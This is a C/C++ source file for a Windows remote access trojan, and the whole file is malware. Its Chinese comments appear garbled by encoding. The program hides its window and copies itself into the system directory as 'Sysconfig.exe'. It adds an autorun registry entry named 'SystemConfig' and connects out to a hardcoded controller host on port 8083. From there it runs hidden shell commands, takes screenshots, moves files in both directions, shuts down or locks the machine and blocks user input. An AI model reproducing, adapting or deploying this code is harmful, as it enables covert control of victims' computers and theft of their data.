#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <winable.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libjpeg/jpeg.lib")
extern "C" {
    #include "jpeglib.h"  
}

#ifdef _MSC_VER  
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
#endif

#define MSG_LEN 1024
#define MSG_LENN 5120


int ServerPort = 8083;  //���ӵĶ˿�
char ServerAddr[] = "oo.xx.com"; //�������ӵ�����
int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);


// �����ļ�
int sendFile(SOCKET client, char *filename) 
{		
    char sendbuf[1024];
    DWORD        dwRead;  
    BOOL         bRet;
	Sleep(200);

    HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hFile==INVALID_HANDLE_VALUE) {
		return 1;
	}
    while(1) {  //�����ļ���buf
        bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
        if(bRet==FALSE) break;
        else if(dwRead==0) {
			Sleep(100);
            break;  
        } else {  
            send(client,sendbuf,dwRead,0);
        }  
    }
	send(client,"EOFYY",strlen("EOFYY")+1,0);
    CloseHandle(hFile);
	if (strcmp(filename,"screen.jpg")==0) {
		system("del screen.jpg");
	}
	
	return 0;
}

// �����ļ�
int recvFile(SOCKET client, char *filename) 
{
	int len;
    char recvBuf[1024] = {0};   // ������
    HANDLE hFile;               // �ļ����
    DWORD count;                // д������ݼ���
 
    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if(hFile==INVALID_HANDLE_VALUE) {
		return 1;
	}
	send(client,"BEGIN",6,0);
    while (1) {
        // �ӿͻ��˶�����
		ZeroMemory(recvBuf, sizeof(recvBuf));   
		len = recv(client, recvBuf, 1024, 0);
        if (strlen(recvBuf) < 5) {
            if (strcmp(recvBuf, "EOF") == 0) {
                CloseHandle(hFile);
                break;
            }
		}
        WriteFile(hFile,recvBuf,len,&count,0);
    }
	Sleep(500);
	send(client,"RECV",5,0);
	return 0;
}

// ִ��CMD����ܵ�����
int cmd(char *cmdStr, char *message)
{
    DWORD readByte = 0;
    char command[1024] = {0};
    char buf[MSG_LENN] = {0}; //������
 
    HANDLE hRead, hWrite;
    STARTUPINFO si;         // ����������Ϣ
    PROCESS_INFORMATION pi; // ������Ϣ
    SECURITY_ATTRIBUTES sa; // �ܵ���ȫ����
 
    // ���ùܵ���ȫ����
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
 
    // ���������ܵ����ܵ�����ǿɱ��̳е�
	if( !CreatePipe(&hRead, &hWrite, &sa, MSG_LENN)) {
        return 1;
    }
 
    // ���� cmd ������Ϣ
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); // ��ȡ���ݴ�С
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // ��׼�����ʹ�ö����
    si.wShowWindow = SW_HIDE;               // ���ش�������
    si.hStdOutput = si.hStdError = hWrite;  // ������ʹ�����ָ��ܵ�д��һͷ

	// ƴ�� cmd ����
	sprintf(command, "cmd.exe /c %s", cmdStr);
 
    // �����ӽ���,��������,�ӽ����ǿɼ̳е�
    if ( !CreateProcess( NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
        CloseHandle( hRead );
        CloseHandle( hWrite );
		printf("error!");
        return 1;
    }
    CloseHandle( hWrite );
  
    //��ȡ�ܵ���read��,���cmd���
    while (ReadFile( hRead, buf, MSG_LENN, &readByte, NULL )) {
        strcat(message, buf);
        ZeroMemory( buf, MSG_LENN );
    }
    CloseHandle( hRead );

    return 0;
}

//bmpתjpg�㷨
int bmptojpg24x(const char *strSourceFileName, const char *strDestFileName, int quality)  
{  
    BITMAPFILEHEADER bfh;       // bmp�ļ�ͷ  
    BITMAPINFOHEADER bih;       // bmpͷ��Ϣ  
    RGBQUAD rq[256];            // ��ɫ��  
    int i=0;  
  
    BYTE *data= NULL;//new BYTE[bih.biWidth*bih.biHeight];  
    BYTE *pData24 = NULL;//new BYTE[bih.biWidth*bih.biHeight];  
    int nComponent = 0;  
  
    // ��ͼ���ļ�  
    FILE *f = fopen(strSourceFileName,"rb");  
    if (f==NULL) {
        return 1;  
    }  
    // ��ȡ�ļ�ͷ��ͼ����Ϣ 
    fread(&bfh,sizeof(bfh),1,f);
	fread(&bih,sizeof(bih),1,f); 
    
	data= new BYTE[bih.biWidth*bih.biHeight*4];  
    pData24 = new BYTE[bih.biWidth*bih.biHeight*3];  
    fseek(f,bfh.bfOffBits,SEEK_SET);      
    fread(data,bih.biWidth*bih.biHeight*4,1,f);  
    fclose(f);  
    for (i = 0;i<bih.biWidth*bih.biHeight;i++) {
        pData24[i*3] = data[i*4+2];  
        pData24[i*3+1] = data[i*4+1];  
        pData24[i*3+2] = data[i*4];  
     }  
     nComponent = 3;
  
    // ����ͼ���ȡ���  
    struct jpeg_compress_struct jcs;  
    struct jpeg_error_mgr jem;  
    jcs.err = jpeg_std_error(&jem);  
  
    jpeg_create_compress(&jcs);  
  
    f=fopen(strDestFileName,"wb");  
    if (f==NULL) {
        delete [] data;  
        return 1;  
    }  
    jpeg_stdio_dest(&jcs, f);  
    jcs.image_width = bih.biWidth;          // Ϊͼ�Ŀ�͸ߣ���λΪ����   
    jcs.image_height = bih.biHeight;  
    jcs.input_components = nComponent;          // 1,��ʾ�Ҷ�ͼ�� ����ǲ�ɫλͼ����Ϊ3   
    if (nComponent==1)  
        jcs.in_color_space = JCS_GRAYSCALE; //JCS_GRAYSCALE��ʾ�Ҷ�ͼ��JCS_RGB��ʾ��ɫͼ��   
    else   
        jcs.in_color_space = JCS_RGB;  
  
    jpeg_set_defaults(&jcs);      
    jpeg_set_quality (&jcs, quality, true);  
    jpeg_start_compress(&jcs, TRUE);  
 
    JSAMPROW row_pointer[1];            // һ��λͼ  
    int row_stride;                     // ÿһ�е��ֽ���   
  
    row_stride = jcs.image_width*nComponent; // �����������ͼ,�˴���Ҫ����3  
  
    // ��ÿһ�н���ѹ��  
    while (jcs.next_scanline < jcs.image_height) {  
        row_pointer[0] = & pData24[(jcs.image_height-jcs.next_scanline-1) * row_stride];  
        jpeg_write_scanlines(&jcs, row_pointer, 1);  
    }  
  
    jpeg_finish_compress(&jcs);  
    jpeg_destroy_compress(&jcs);  
  
    fclose(f);  
    delete [] data;  
    delete [] pData24;  
  
	system("del screen.bmp");
    return 0;
} 

// ��Ļ����
int CaptureImage(HWND hwnd, CHAR *dirPath, CHAR *filename)
{
    HANDLE hDIB;
    HANDLE hFile;
    DWORD dwBmpSize;
    DWORD dwSizeofDIB;
    DWORD dwBytesWritten;
    CHAR FilePath[MAX_PATH];
    HBITMAP hbmScreen = NULL;
    BITMAP bmpScreen;
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    CHAR *lpbitmap;
    INT width = GetSystemMetrics(SM_CXSCREEN);  // ��Ļ��
    INT height = GetSystemMetrics(SM_CYSCREEN);  // ��Ļ��
    HDC hdcScreen = GetDC(NULL); // ȫ��ĻDC
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen); // ���������ڴ�DC
 
    if (!hdcMemDC) goto done;
 
    // ͨ������DC ����һ������λͼ
    hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
 
    if (!hbmScreen) goto done;
 
    // ��λͼ�鴫�͵������ڴ�DC��
    SelectObject(hdcMemDC, hbmScreen);
    if (!BitBlt(
                hdcMemDC,    // Ŀ��DC
                0, 0,        // Ŀ��DC�� x,y ����
                width, height, // Ŀ�� DC �Ŀ��
                hdcScreen,   // ��ԴDC
                0, 0,        // ��ԴDC�� x,y ����
                SRCCOPY))    // ճ����ʽ
        goto done;
  
    // ��ȡλͼ��Ϣ������� bmpScreen ��
    GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
 
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
 
    dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

    // handle ָ�����Ĭ�ϵĶ�
    hDIB = GlobalAlloc(GHND, dwBmpSize);
    lpbitmap = (char *)GlobalLock(hDIB);
 
    // ��ȡ����λͼ��λ���ҿ��������һ�� lpbitmap ��.
    GetDIBits(
        hdcScreen,  // �豸�������
        hbmScreen,  // λͼ���
        0,          // ָ�������ĵ�һ��ɨ����
        (UINT)bmpScreen.bmHeight, // ָ��������ɨ������
        lpbitmap,   // ָ����������λͼ���ݵĻ�������ָ��
        (BITMAPINFO *)&bi, // �ýṹ�屣��λͼ�����ݸ�ʽ
        DIB_RGB_COLORS // ��ɫ���ɺ졢�̡�����RGB������ֱ��ֵ����
    );
 
 
    wsprintf(FilePath, "%s\\%s.bmp", dirPath, filename);
 
    // ����һ���ļ��������ļ���ͼ
    hFile = CreateFile(
                FilePath,
                GENERIC_WRITE,
                0,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
 
    // �� ͼƬͷ(headers)�Ĵ�С, ����λͼ�Ĵ�С����������ļ��Ĵ�С
    dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 
    // ���� Offset ƫ����λͼ��λ(bitmap bits)ʵ�ʿ�ʼ�ĵط�
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
 
    // �ļ���С
    bmfHeader.bfSize = dwSizeofDIB;
 
    // λͼ�� bfType �������ַ��� "BM"
    bmfHeader.bfType = 0x4D42; //BM
 
    dwBytesWritten = 0;
    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
 
    // �������ڴ沢�ͷ�
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
 
    // �ر��ļ����
    CloseHandle(hFile);
 
    // ������Դ
done:
    DeleteObject(hbmScreen);
    DeleteObject(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);

	Sleep(200);
	bmptojpg24x("screen.bmp", "screen.jpg", 50);
 
    return 0;
}

void c_socket() 
{

	// ��ʼ�� Winsock
	WSADATA wsaData;
	struct hostent *host;
	struct in_addr addr;

	int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );
	if ( iResult != NO_ERROR ) {
			//printf("Error at WSAStartup()\n");
	}
	while(1){

		//����������ַ
		host = gethostbyname(ServerAddr);
		if( host == NULL ) {
			Sleep(20000);
			continue;
		}else{
			addr.s_addr = *(unsigned long * )host->h_addr;
			break;
		}
	}

	// ����socket socket.
	SOCKET client;
	client = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( client == INVALID_SOCKET ) {
		printf( "Error at socket(): %ld\n", WSAGetLastError() );
		WSACleanup();
		return;
	}

	//��ȡ���������û���
	char userName[20]={0};
	char comName[20]={0};
	char comInfo[40]={0};
	DWORD nameLen = 20;
	DWORD comLen = 20;
	GetUserName(userName,&nameLen);
	GetComputerName(comName,&comLen);
	sprintf(comInfo, "%s#%s", comName, userName);

	// ���ӵ�������.
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	//clientService.sin_addr.s_addr = inet_addr("10.0.0.4");
	clientService.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
	clientService.sin_port = htons(ServerPort);
	while(1){
		if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
			//printf( "\nFailed to connect.\nWait 10s...\n" );
			Sleep(20000);
			continue;
		}else {
			send(client,comInfo, 40, 0);
			break;
		}
	}

	//�����ȴ������ָ��
	char recvCmd[MSG_LEN] = {0};
	char message[MSG_LENN+10] = {0};
	while(1) {
		ZeroMemory(recvCmd, sizeof(recvCmd));
		ZeroMemory(message,sizeof(message));

		//�ӷ���˻�ȡ����
        recv(client, recvCmd, MSG_LEN, 0);
		if(strlen(recvCmd)<1){  //SOCKET�ж�����
			closesocket(client);
			while(1){
				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
					//printf( "\nFailed to connect.\nWait 10s...\n" );
					Sleep(20000);
					continue;
				}else {
					send(client,comInfo, 40, 0);
					break;
				}
			}
			continue;
		}else if(strcmp(recvCmd,"shutdown")==0){  //�ػ�
			system("shutdown -s -t 1");
			continue;
		}else if(strcmp(recvCmd,"reboot")==0){  //����
			system("shutdown -r -t 10");
			continue;
		}else if(strcmp(recvCmd,"cancel")==0){  //ȡ���ػ�
			system("shutdown -a");
			continue;
		}else if(strcmp(recvCmd,"kill-client")==0){  //�رտͻ���
			send(client,"Client has exit!", 18, 0);
			exit(0);
		}else if(strcmp(recvCmd,"screenshot")==0){  //����
			CaptureImage(GetDesktopWindow(), "./", "screen"); //����screen.jpg
			sendFile(client,"screen.jpg");
			continue;
		}else if((recvCmd[0]=='$') || (recvCmd[0]=='@')){
			int i;
			char c;
			char CMD[30]={0};
			for(i = 1;(c = recvCmd[i])!= '\0';i ++) {
				CMD[i-1] = recvCmd[i];
			}
			if(recvCmd[0] == '$') {  //ִ������ָ��
				if(! cmd(CMD,message)) send(client, message, strlen(message)+1, 0);
				else send(client,"CMD Error!\n",13,0);
			}else {  //����
				MessageBox(NULL,CMD,"Windows Message",MB_OK|MB_ICONWARNING);
			}
			continue;
		}else if(strcmp(recvCmd,"lock")==0){ //����
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
			continue;
		}else if(strcmp(recvCmd,"blockinput")==0){ //�������ͼ���
			BlockInput(true);
			Sleep(5000);
			BlockInput(false);
			continue;
		}else if(strcmp(recvCmd,"mouse")==0){ //���ù��
			SetCursorPos(0,0);
			continue;
		}else if(strcmp(recvCmd,"download")==0){ //�ϴ��ļ�
			ZeroMemory(recvCmd, sizeof(recvCmd));
			recv(client, recvCmd, MSG_LEN, 0);
			if(sendFile(client,recvCmd)) {
				send(client,"EOFNN",strlen("EOFNN")+1,0);
			}
			continue;
		}else if(strcmp(recvCmd,"upload")==0){ //�����ļ�
			ZeroMemory(recvCmd, sizeof(recvCmd));
			recv(client, recvCmd, MSG_LEN, 0);
			if(recvFile(client,recvCmd)){
				send(client,"ERRO", 5, 0);
			}
			continue;
		}else{
			continue;
		}
	}
	WSACleanup();
    return;
}

//������
int copySelf(char *path)
{
	char fileName[MAX_PATH];
	char sysPath[MAX_PATH];
	GetModuleFileName(NULL,fileName, sizeof(fileName));
	GetSystemDirectory(sysPath, sizeof(sysPath));
	sprintf(path,"%s\\Sysconfig.exe",sysPath);
	CopyFile(fileName, path, TRUE);

	return 0;
}

int autoRun(char *path)
{
    HKEY hKey;
    DWORD result;
 
    //��ע���
    result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", // Ҫ�򿪵�ע���������
        0,              // �������������� 0
        KEY_SET_VALUE,  // ��Ȩ�ޣ�д��
        &hKey           // ��֮��ľ��
    );

    if (result != ERROR_SUCCESS) return 0;

    // ��ע���������(û���������һ��ֵ)
    result = RegSetValueEx(
                 hKey,
                 "SystemConfig", // ����
                 0,                  // �������������� 0
                 REG_SZ,             // ��ֵ����Ϊ�ַ���
                 (const unsigned char *)path, // �ַ����׵�ַ
                 strlen(path)        // �ַ�������
             );

    if (result != ERROR_SUCCESS) return 0;
 
    //�ر�ע���:
    RegCloseKey(hKey);

    return 0;
}

int main()
{
	char path[MAX_PATH];

	copySelf(path);
	autoRun(path);
	c_socket();

	return 0;
}
